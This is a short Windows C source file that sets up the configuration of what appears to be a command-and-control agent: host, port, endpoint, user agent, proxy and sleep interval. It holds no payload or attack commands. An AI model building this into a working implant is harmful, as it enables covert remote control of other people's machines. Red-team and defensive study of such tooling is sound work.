#include "corn.h"
#include "agent_config.h"
#include <windows.h>

CONFIG_CORN corn_config = {0}; // initial

int SetupAgentConfig(void){
    corn_config.AgentID = initUUID;
    corn_config.HostName = hostname;
    corn_config.HttpPort = httpport;
    corn_config.HttpMethod = httpmethod;
    corn_config.EndPoint = endpoint;
    corn_config.UserAgent = useragent;
    corn_config.IsSSL = isssl;
    corn_config.IsProxyEnabled = proxyenabled;
    corn_config.ProxyURL = proxyurl;
    corn_config.SleepTime = sleeptime;
}

int main(void){
    SetupAgentConfig();
}

